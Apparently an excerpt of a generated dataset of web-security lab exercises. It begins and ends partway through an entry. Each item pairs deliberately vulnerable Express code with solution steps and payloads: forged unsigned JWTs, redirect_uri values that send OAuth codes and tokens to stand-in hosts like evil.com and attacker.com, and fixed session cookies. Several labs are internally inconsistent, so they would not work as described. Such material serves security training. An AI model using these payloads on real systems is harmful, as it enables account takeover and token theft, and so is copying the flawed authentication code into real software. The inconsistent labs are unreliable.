  "Solution Steps": [
    "1. Use Postman to send a query to /graphql with a valid JWT in Authorization header and observe response format.",
    "2. Decode your JWT token using jwt.io and observe the `alg` field in the header.",
    "3. Replace the algorithm with 'none', set 'sub' to 'carlos', remove the signature completely.",
    "4. Use the forged token in Authorization: Bearer [token] and send a POST /graphql query { me { username, email } }.",
    "5. If token is accepted, extract Carlos’s data to verify the impersonation and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', email: 'carlos@example.com' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, 'secret'); if (decoded.sub === 'carlos') { res.json({ data: { me: users[0] } }); } else { res.status(403).send('Forbidden'); } } catch (e) { res.status(401).send('Invalid token'); } }); app.listen(4000);",
  "payloads": [
    "JWT Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "JWT Payload: { \"sub\": \"carlos\" }",
    "Unsigned JWT: base64(header).base64(payload).",
    "Authorization: Bearer [unsigned-token]"
  ]
},
{
  "Lab scenario": "OAuth Authorization Code Interception via Open Redirect in Redirect URI",
  "Lab Description": "The application uses OAuth 2.0 for login with an open redirect vulnerability in its redirect_uri parameter. This allows attackers to intercept authorization codes. To solve: Use the redirect_uri to intercept Carlos’s authorization code and exchange it for his token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Start OWASP ZAP and intercept the OAuth flow starting from GET /auth?client_id=xyz&redirect_uri=https://vuln.site/redirect.",
    "2. Modify the redirect_uri to https://evil.com/callback and observe the code parameter being leaked there.",
    "3. Trick Carlos into clicking the malicious OAuth login link using a redirect_uri to your controlled domain.",
    "4. Capture the authorization code from your server logs or OWASP ZAP.",
    "5. Use Postman to POST the code to /token endpoint: client_id=xyz&code=stolen_code&redirect_uri=https://evil.com/callback.",
    "6. Receive access_token and access Carlos’s /profile endpoint to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authCodes = { 'auth123': 'carlos_token' }; app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'auth123'; res.redirect(redirect_uri + '?code=' + code); }); app.post('/token', (req, res) => { const { code } = req.body; if (authCodes[code]) { res.json({ access_token: authCodes[code] }); } else { res.status(400).send('Invalid code'); } }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos_token') { res.send('Carlos Profile Data'); } else { res.status(403).send('Forbidden'); } }); app.listen(4000);",
  "payloads": [
    "OAuth URL with redirect_uri=https://evil.com/callback",
    "Captured code=auth123 from evil.com log",
    "POST /token with code=auth123",
    "Authorization: Bearer carlos_token"
  ]
},
{
  "Lab scenario": "REST API Session Fixation via Path Parameter",
  "Lab Description": "This application's RESTful session handling is vulnerable to session fixation. The session token is accepted from a URL path parameter before login. The application binds the session to the authenticated user without regenerating the token. To solve: hijack Carlos's session using a fixed token.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept pre-login GET /session/{token} with Burp Suite to observe session initialization.",
    "Send the same token value in POST /login request as a URL path parameter while authenticating.",
    "Craft and deliver the fixed session link with token=attacker-session-id to Carlos via social engineering.",
    "Carlos logs in via poisoned link; attacker reuses same token to access authenticated session.",
    "Verify by accessing GET /my-account with session header set to fixed token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/session/:sid', (req, res) => { const sid = req.params.sid; sessions[sid] = { user: null }; res.cookie('session', sid); res.send('Session initialized'); }); app.post('/login/:sid', (req, res) => { const sid = req.params.sid; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid] = { user: username }; res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.headers['x-session-id']; if (sessions[sid] && sessions[sid].user) { res.send('Welcome ' + sessions[sid].user); } else { res.status(403).send('Not logged in'); } }); app.listen(4001, () => console.log('Session Fixation Lab running on port 4001'));",
  "payloads": [
    "GET /session/fixed123",
    "POST /login/fixed123 {\"username\":\"carlos\",\"password\":\"hunter2\"}",
    "GET /my-account with Header x-session-id: fixed123"
  ]
},
{
  "Lab scenario": "GraphQL JWT Forgery via None Algorithm",
  "Lab Description": "This application's GraphQL login mutation issues a JWT token signed with HS256 but fails to enforce algorithm validation. To solve: forge a JWT using 'alg':'none' to impersonate the admin user.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to submit a login mutation and extract the returned JWT.",
    "Decode the JWT in jwt.io and observe the algorithm used in header (HS256).",
    "Replace the alg field in JWT header with 'none' and re-encode with admin payload.",
    "Send GraphQL query with Authorization: Bearer [forged token] to access admin data.",
    "Validate lab success by fetching admin's profile with forged JWT."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'supersecret' }]; app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('login')) { const { username, password } = req.body.variables; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ user: username }, 'shhhh', { algorithm: 'HS256' }); return res.json({ data: { login: token } }); } return res.status(401).json({ error: 'Invalid login' }); } else if (query.includes('getProfile')) { const auth = req.headers.authorization?.split(' ')[1]; try { const payload = jwt.verify(auth, 'shhhh'); if (payload.user === 'admin') return res.json({ data: { profile: 'admin details' } }); } catch (e) { return res.status(403).json({ error: 'Forbidden' }); } } }); app.listen(4002, () => console.log('JWT None Algorithm Lab running on port 4002'));",
  "payloads": [
    "{\"alg\":\"none\"}.eyJ1c2VyIjoiYWRtaW4ifQ.",
    "Authorization: Bearer [forged-token]",
    "POST /graphql { \"query\": \"query { getProfile }\" }"
  ]
},
{
  "Lab scenario": "OAuth Access Token Leak via Referrer Header in SOAP API",
  "Lab Description": "This application's OAuth implicit flow exposes the access token via fragment in redirect_uri. The token is leaked through the Referrer header when redirected to a SOAP endpoint with inline content. To solve: extract and reuse Carlos's leaked token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Trigger OAuth login flow and observe redirect URI format containing #access_token in URL fragment.",
    "Redirect to a SOAP endpoint with embedded inline content loading from external domain.",
    "Observe browser sends full referrer including token to attacker-controlled domain.",
    "Extract token from intercepted Referrer and use it in Authorization header.",
    "Use token to access GET /soap/user-profile?uid=carlos and retrieve sensitive data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const profiles = { 'carlos': 'Carlos Secret Profile' }; app.get('/oauth/callback', (req, res) => { const token = 'eyJhbGciOi...'; res.send(`<iframe src='/soap?uid=carlos'></iframe>`); }); app.get('/soap/user-profile', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (token === 'eyJhbGciOi...') { return res.send(profiles[req.query.uid]); } res.status(403).send('Access denied'); }); app.listen(4003, () => console.log('OAuth Referrer Leak Lab running on port 4003'));",
  "payloads": [
    "https://target.com/oauth/callback#access_token=eyJhbGciOi...",
    "Intercept Referer header leaking token via <iframe src>",
    "GET /soap/user-profile?uid=carlos with Authorization: Bearer eyJhbGciOi..."
  ]
},
{
  "Lab scenario": "Session fixation vulnerability in REST authentication flow",
  "Lab Description": "This lab's session management implementation allows attackers to fixate a session ID before login. The application issues a session cookie pre-authentication and continues to use it post-login without rotating it. This allows session hijacking via fixation. To solve: Fixate a session ID, get the victim to log in, and access their account using the fixed session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a GET /login request and observe the session cookie assigned by the server.",
    "2. Note that the session remains unchanged after login, confirming the server does not rotate session tokens.",
    "3. Craft a phishing link with the session cookie set manually in the victim's browser using document.cookie or by intercepting the response.",
    "4. Wait for the victim to log in using the pre-fixed session.",
    "5. Reuse the fixed session cookie in your browser to access the victim's /my-account endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'session123' }]; app.get('/login', (req, res) => { res.cookie('sid', req.cookies.sid || Math.random().toString(36).substr(2), { httpOnly: true }); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { res.send('Logged in'); } else { res.status(401).send('Invalid'); } }); app.get('/my-account', (req, res) => { if (req.cookies.sid === 'victim-session') { res.send('Carlos account page'); } else { res.status(403).send('Access Denied'); } }); app.listen(3000, () => console.log('Session Fixation Lab at http://localhost:3000'));",
  "payloads": [
    "document.cookie = 'sid=victim-session';",
    "Set-Cookie: sid=victim-session",
    "GET /my-account with Cookie: sid=victim-session"
  ]
},
{
  "Lab scenario": "JWT tampering via algorithm confusion in GraphQL-based login",
  "Lab Description": "The JWT authentication mechanism is flawed due to unsafe handling of the 'alg' claim in the token header. The server accepts unsigned JWTs if the 'alg' is set to 'none'. To solve: Forge an unsigned JWT for the admin user and access the protected GraphQL admin dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Postman to send a login GraphQL mutation and capture the JWT returned.",
    "2. Decode the JWT using jwt.io and inspect the header and payload structure.",
    "3. Modify the header to use 'alg':'none' and set payload to {\"username\":\"admin\"}. Remove the signature.",
    "4. Send a GraphQL query to the /graphql endpoint with the forged token in the Authorization header.",
    "5. Access the admin dashboard by querying {adminPanel {secret}} and confirm exploitation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'admin', password: 'adminpass' }]; app.post('/graphql', (req, res) => { const auth = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(auth, 'secret'); if (decoded.username === 'admin') return res.json({ data: { adminPanel: { secret: 'FLAG-SECRET-123' } } }); } catch (e) { return res.status(403).send('Invalid token'); } res.json({ data: { userPanel: { info: 'Normal user' } } }); }); app.listen(4000, () => console.log('JWT None Algorithm Lab on http://localhost:4000'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "Authorization: Bearer [unsigned JWT]",
    "GraphQL query: { adminPanel { secret } }"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in redirect URI validation",
  "Lab Description": "The OAuth provider fails to properly validate redirect URIs, allowing attackers to steal authorization codes. The vulnerable client accepts subdomains of allowed redirect URIs, which can be exploited for code hijacking. To solve: Create a malicious subdomain to capture the authorization code for carlos and exchange it for an access token.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Intercept the OAuth flow using Burp Suite during login and observe the 'redirect_uri' parameter.",
    "2. Register a domain like evil.com and host a server on oauth.evil.com.",
    "3. Replace the redirect_uri with https://oauth.evil.com/callback and capture the authorization code in the query string.",
    "4. Use Postman to send a POST request to the token endpoint with the stolen code and redirect_uri set to your malicious domain.",
    "5. Use the access token to call the /me endpoint and confirm access to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: true })); const authorizedRedirects = ['https://trusted.com/callback']; const tokens = {}; app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const code = 'authcode123'; tokens[code] = 'carlos-token'; res.redirect(`${redirect_uri}?code=${code}`); }); app.post('/token', (req, res) => { const { code, redirect_uri } = req.body; if (tokens[code]) { res.json({ access_token: tokens[code] }); } else { res.status(400).send('Invalid code'); } }); app.get('/me', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-token') { res.send('Carlos account access granted'); } else { res.status(403).send('Forbidden'); } }); app.listen(5000, () => console.log('OAuth Misconfig Lab at http://localhost:5000'));",
  "payloads": [
    "https://oauth.evil.com/callback",
    "POST /token with stolen code and malicious redirect_uri",
    "Authorization: Bearer carlos-token"
  ]
},
{
  "Lab scenario": "GraphQL Session Fixation in Login Token Exchange",
  "Lab Description": "The application's GraphQL login mutation is vulnerable to session fixation. The application issues a session token before authentication and does not invalidate it after login. To solve: exploit session fixation to hijack Carlos's session and access his profile.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a GraphQL mutation for login. Note the issued session cookie before authentication.",
    "2. Replay the pre-login GraphQL mutation from Postman and capture the Set-Cookie header.",
    "3. Send this session ID to the victim via phishing or predict a reusable ID if predictable.",
    "4. Log in as the victim using the same session token. Observe that the session is still valid post-login.",
    "5. Access /graphql with query: { profile { username email } } using the hijacked session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(session({ secret: 'insecure', resave: true, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'hunter2' }]; const schema = buildSchema(`type Query { profile: User } type Mutation { login(username: String!, password: String!): String } type User { username: String, email: String }`); const root = { login: ({ username, password }, req) => { const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; return 'Login successful'; } return 'Login failed'; }, profile: (args, req) => { if (req.session.user) { return { username: req.session.user, email: req.session.user + '@example.com' }; } throw new Error('Unauthorized'); } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true }))); app.listen(4000);",
  "payloads": [
    "mutation { login(username: \"carlos\", password: \"hunter2\") }",
    "query { profile { username email } }"
  ]
},
{
  "Lab scenario": "JWT Token Tampering in Authorization Header",
  "Lab Description": "The application's JWT authentication relies solely on the 'alg' header value and fails to enforce a server-side signature check. This allows the use of 'none' algorithm to forge valid tokens. To solve: forge a token that impersonates carlos and access the /admin page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Intercept the Authorization header after logging in with your own credentials using Burp Suite.",
    "2. Decode the JWT using jwt.io and note the 'alg' and 'kid' values in the header.",
    "3. Modify the JWT header to use 'alg':'none' and remove the signature portion.",
    "4. Change the payload to impersonate carlos: { \"username\":\"carlos\", \"role\":\"admin\" }.",
    "5. Send a GET request to /admin with the forged JWT in the Authorization header using Postman."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'pass123', role: 'admin' }]; const secret = 'topsecret'; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username: user.username, role: user.role }, secret, { algorithm: 'HS256' }); return res.json({ token }); } res.status(403).send('Invalid'); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { req.user = decoded.payload; return res.send('Admin Panel - Welcome ' + req.user.username); } try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Admin Panel - Verified'); } catch (e) { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
    "Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth Implicit Grant Open Redirect in Callback Handler",
  "Lab Description": "The OAuth flow uses the implicit grant type with an insecure open redirect vulnerability in the redirect_uri. This enables stealing the access token via a malicious redirect endpoint. To solve: exploit the redirect_uri to capture Carlos's access token and access his profile.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to initiate an OAuth login flow and capture the authorization URL.",
    "2. Note the use of response_type=token and redirect_uri pointing to /oauth-callback.",
    "3. Modify the redirect_uri to point to your own malicious server (e.g., https://evil.com#access_token=).",
    "4. Trick the victim into clicking the malicious OAuth URL to redirect the token to your server.",
    "5. Replay the stolen token against GET /user/profile with the Authorization header in Postman."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos': 'abc123-token-carlos' }; const users = [{ username: 'carlos', profile: 'Sensitive profile info' }]; app.get('/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; if (response_type === 'token' && redirect_uri) { return res.redirect(`${redirect_uri}#access_token=abc123-token-carlos`); } res.send('Invalid request'); }); app.get('/user/profile', (req, res) => { const auth = req.headers['authorization']; const token = auth && auth.split(' ')[1]; if (Object.values(tokens).includes(token)) { return res.send('Sensitive profile info of carlos'); } res.status(403).send('Access denied'); }); app.listen(4000);",
  "payloads": [
    "https://vulnerable-app.com/authorize?response_type=token&client_id=123&redirect_uri=https://evil.com",
    "Authorization: Bearer abc123-token-carlos"
  ]
},
{
  "Lab scenario": "Session fixation in login workflow via manipulated session token",
  "Lab Description": "The application uses a fixed session token before and after login, allowing session fixation. The session ID is issued before authentication and persists after login without regeneration. The application reflects the session cookie in verbose logs, enabling pre-auth hijacking. To solve: Fixate a session token pre-login and use it post-login to access Carlos's account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept a GET /login request and capture the Set-Cookie header",
    "Verify the same session token remains valid after successful login by replaying it",
    "Craft a phishing request sending a malicious session ID to the victim before login",
    "Use the fixed session ID post-victim login to hijack the session",
    "Verify access to /account/carlos and capture the session token to complete the lab"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'pass123' }]; app.use((req, res, next) => { if (!req.cookies.session_id) { const sid = 'sess_' + Math.random().toString(36).substring(2); sessions[sid] = { username: null }; res.cookie('session_id', sid); console.log('Generated new session:', sid); } next(); }); app.post('/login', (req, res) => { const sid = req.cookies.session_id; const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid].username = username; res.send('Login successful'); } else { res.status(401).send('Invalid login'); } }); app.get('/account/:user', (req, res) => { const sid = req.cookies.session_id; if (sessions[sid] && sessions[sid].username === req.params.user) { res.send('Access granted to ' + req.params.user); } else { res.status(403).send('Access denied'); } }); app.listen(5000, () => console.log('Session Fixation Lab running on http://localhost:5000'));",
  "payloads": [
    "Set-Cookie: session_id=sess_attacker123;",
    "POST /login HTTP/1.1 with session_id=sess_attacker123",
    "GET /account/carlos with Cookie: session_id=sess_attacker123"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion with none bypass",
  "Lab Description": "The application uses JWT for session authentication. It verifies JWT tokens using a symmetric secret and allows tokens with alg=none due to misconfiguration. An attacker can craft a token with alg=none and no signature to impersonate any user. To solve: Forge a JWT with alg=none and access Carlos's profile.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to capture the Authorization header with the JWT token",
    "Decode the JWT and identify the 'alg' field is set to HS256",
    "Modify the token to use alg=none and remove the signature",
    "Inject a forged payload with sub set to 'carlos'",
    "Send the modified token and verify access to /api/user/carlos"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'secretkey123'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ sub: username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user/:id', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('Unauthorized'); const token = auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.sub === req.params.id) return res.send('Access granted to ' + decoded.sub); else return res.status(403).send('Forbidden'); } try { const verified = jwt.verify(token, secret); if (verified.sub === req.params.id) res.send('Access granted to ' + verified.sub); else res.status(403).send('Forbidden'); } catch (e) { res.status(403).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT None Algorithm Lab running on http://localhost:4000'));",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
    "Payload: {\"sub\":\"carlos\"}",
    "JWT: base64url(header).base64url(payload).",
    "Authorization: Bearer [forged_token]"
  ]
},
{
  "Lab scenario": "OAuth redirect_uri manipulation for code leakage",
  "Lab Description": "The application implements OAuth login via a third-party provider. However, the redirect_uri parameter is vulnerable to manipulation, allowing an attacker to intercept the authorization code. To solve: Exploit the redirect_uri parameter to leak the OAuth code and complete login as Carlos.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to intercept the OAuth authorization redirect request",
    "Locate the redirect_uri parameter and replace it with an attacker-controlled domain",
    "Trigger an OAuth login flow with the modified redirect_uri",
    "Capture the authorization code from the attacker server logs",
    "Exchange the leaked code for a valid access_token and authenticate as Carlos"
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const request = require('request'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const oauth_url = `https://auth.provider.com/oauth?client_id=app123&redirect_uri=${redirect_uri}&response_type=code`; res.redirect(oauth_url); }); app.get('/callback', (req, res) => { const { code } = req.query; request.post('https://auth.provider.com/token', { form: { code, client_id: 'app123', client_secret: 'secret', redirect_uri: 'http://localhost:3000/callback' }}, (err, resp, body) => { if (body.includes('access_token')) res.send('Logged in'); else res.status(403).send('OAuth failed'); }); }); app.listen(3000, () => console.log('OAuth Redirect URI Lab running on http://localhost:3000'));",
  "payloads": [
    "redirect_uri=https://attacker.com/capture",
    "GET /auth?redirect_uri=https://attacker.com/capture",
    "Captured code=xyz from attacker.com server logs",
    "POST to /token with captured code",
    "Access /callback with valid access_token"
  ]
},
{
  "Lab scenario": "OAuth session fixation in SSO redirect flow",
  "Lab Description": "The application uses OAuth for single sign-on (SSO) integration with a third-party provider. The vulnerable component mishandles session identifiers across redirection endpoints. The application fails to regenerate the session token after completing OAuth login, allowing an attacker to fixate the session ID prior to victim login. To solve: hijack Carlos's session by setting a fixed session cookie prior to their OAuth login flow.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to intercept the initial GET /login/oauth request and analyze the redirection to the OAuth provider.",
    "2. Log in with your own account using OAuth, observe that the session cookie remains unchanged before and after login.",
    "3. In Burp, craft a malicious link to initiate OAuth login with a predefined session cookie using the Set-Cookie header injection via a redirect.",
    "4. Send the crafted OAuth login link to Carlos (simulated), ensuring the same fixed session ID is assigned before authentication completes.",
    "5. After Carlos completes login, reuse the fixed session ID to access /account and confirm access to Carlos's session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'insecure-oauth', resave: false, saveUninitialized: true })); app.get('/login/oauth', (req, res) => { const state = req.query.state || 'xyz'; const redirect = `https://oauth-provider/auth?client_id=123&redirect_uri=http://localhost:4000/callback&state=${state}`; res.redirect(redirect); }); app.get('/callback', (req, res) => { req.session.user = 'carlos'; res.redirect('/account'); }); app.get('/account', (req, res) => { if (!req.session.user) return res.send('Login required'); res.send(`Account data for ${req.session.user}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Set-Cookie: connect.sid=sess:attack123",
    "https://target.com/login/oauth?next=%2Fcallback",
    "OAuth redirect with fixed Set-Cookie header",
    "Reuse session cookie: connect.sid=sess:attack123"
  ]
},
{
  "Lab scenario": "JWT algorithm tampering in SOAP login endpoint",
  "Lab Description": "This lab’s SOAP-based login API relies on JWT tokens to manage user sessions. The server incorrectly trusts the algorithm field of incoming tokens, allowing attackers to bypass signature validation by switching to the 'none' algorithm. To solve: generate a JWT token with alg=none and impersonate Carlos.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to inspect the SOAP request to the /soap-auth endpoint and capture the JWT token.",
    "2. Decode the token using jwt.io or Burp Decoder and observe that it is signed with HS256.",
    "3. Modify the token header to use 'alg':'none' and remove the signature.",
    "4. Change the payload to impersonate user 'carlos' and replay the token in the SOAP request.",
    "5. Access /soap-user?username=carlos and verify you’re authenticated as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.text({ type: 'application/soap+xml' })); app.post('/soap-auth', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; try { const decoded = jwt.verify(token, 'secretkey'); res.send(`<soap:Envelope><soap:Body>Welcome ${decoded.user}</soap:Body></soap:Envelope>`); } catch (e) { res.status(403).send('<soap:Envelope><soap:Body>Access Denied</soap:Body></soap:Envelope>'); } }); app.get('/soap-user', (req, res) => { res.send(`SOAP Account page for ${req.query.username}`); }); const PORT = 5000; app.listen(PORT, () => console.log(`JWT None SOAP Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "{ \"alg\": \"none\", \"typ\": \"JWT\" }",
    "{ \"user\": \"carlos\" }",
    "Header: Authorization: Bearer <unsigned_token>",
    "SOAP request with forged token"
  ]
},
{
  "Lab scenario": "GraphQL session fixation via token injection",
  "Lab Description": "The application uses GraphQL for authentication and session establishment. It insecurely accepts a user-provided token through a GraphQL mutation and sets it as the session token without validation. To solve: fixate a session token for Carlos by injecting a token value pre-login, then use that token to hijack the session post-login.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman or Burp to send a GraphQL mutation to /graphql with a hardcoded token value.",
    "2. Analyze the response headers and observe the Set-Cookie header reflects your custom token.",
    "3. Simulate the attack by sending the token injection to Carlos’s browser (simulated).",
    "4. Wait for Carlos to complete login; he will inherit the fixed token.",
    "5. Reuse the same token in your session cookie to access /graphql/account and confirm access."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const sessions = {}; app.use(bodyParser.json()); app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('login')) { const token = req.body.variables.token || `sess_${Math.random()}`; sessions[token] = req.body.variables.username; res.cookie('session', token); return res.send({ data: { login: 'Logged in' } }); } if (query.includes('account')) { const token = req.cookies.session; const user = sessions[token]; return res.send({ data: { user } }); } res.send({ error: 'Invalid query' }); }); const PORT = 6000; app.listen(PORT, () => console.log(`GraphQL Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "mutation login($username: String!, $token: String!) { login(username: $username, token: $token) }",
    "{ \"username\": \"carlos\", \"token\": \"fixed-session-token\" }",
    "Cookie: session=fixed-session-token",
    "query { account { user } }"
  ]
},
{
  "Lab scenario": "Legacy session fixation vulnerability in REST login flow",
  "Lab Description": "The application's login flow does not invalidate existing session cookies when a user logs in. The session token is preserved from the unauthenticated state to the authenticated state. This allows an attacker to fixate a session ID and trick a victim into authenticating with it. The application sets session cookies before login and reuses them post-authentication. To solve: Fixate a session ID, trick Carlos into logging in with it, then use it to access his account page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept GET /login and note the issued Set-Cookie header for sessionId.",
    "Send a crafted link to Carlos with a preset sessionId using Burp Collaborator or intercepted client-side script.",
    "After Carlos logs in, reuse the fixed sessionId from step 1 in a GET /my-account request.",
    "Confirm that the fixed session is now authenticated as Carlos.",
    "Access /my-account using the session to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.json()); const sessions = {}; const users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { let sid = req.cookies.sid || Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sid', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; if (sid && sessions[sid]) { sessions[sid].authenticated = true; sessions[sid].username = username; res.send('Logged in'); } else { res.status(400).send('Session missing'); } } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid] && sessions[sid].authenticated) { res.send(`Welcome ${sessions[sid].username}`); } else { res.status(403).send('Access denied'); } }); app.listen(4000);",
  "payloads": [
    "Set-Cookie: sid=attacker-fixed-id;",
    "GET /my-account with sid after victim login",
    "Use <script> to preload fixed cookie"
  ]
},
{
  "Lab scenario": "JWT kid header injection in SOAP authentication handler",
  "Lab Description": "The application's SOAP-based authentication endpoint uses JWTs with a vulnerable `kid` header, allowing injection of a local file path. The application uses `fs.readFileSync(kid)` to load the secret key. To solve: Forge a valid JWT for Carlos using key injection via the `kid` header and access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to send a login request to /authService via SOAP XML.",
    "Extract and analyze the JWT from the response and decode it using jwt.io.",
    "Modify the `kid` header in the JWT to point to a known file path (e.g., /dev/null or public.pem).",
    "Use Node.js to forge a new JWT with the modified header and payload `{ \"username\": \"carlos\" }`.",
    "Send the forged token via SOAP header and access /my-account."
  ],
  "Vulnerability name": "Authentication",
